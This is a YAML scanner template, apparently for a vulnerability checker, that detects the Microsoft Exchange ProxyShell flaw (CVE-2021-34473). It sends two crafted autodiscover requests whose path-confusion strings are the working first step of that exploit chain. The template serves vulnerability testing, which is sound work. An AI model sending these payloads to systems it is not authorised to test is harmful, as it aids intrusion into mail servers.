name: poc-yaml-exchange-server-cve-2021-34473-rce
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com
            follow_redirects: false
        expression: response.status >= 300 && response.status < 400 && response.body_string.contains("Microsoft.Exchange.Clients.Owa2.Server.Core.OwaADUserNotFoundException")
    r1:
        request:
            cache: true
            method: GET
            path: /autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com
            headers:
                Accept: '*/*'
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("Exchange MAPI/HTTP Connectivity Endpoint")
expression: r0() && r1()
detail:
    author: 小z
    links:
        - https://packetstormsecurity.com/files/163895/Microsoft-Exchange-ProxyShell-Remote-Code-Execution.html
    vulnerability:
        level: critical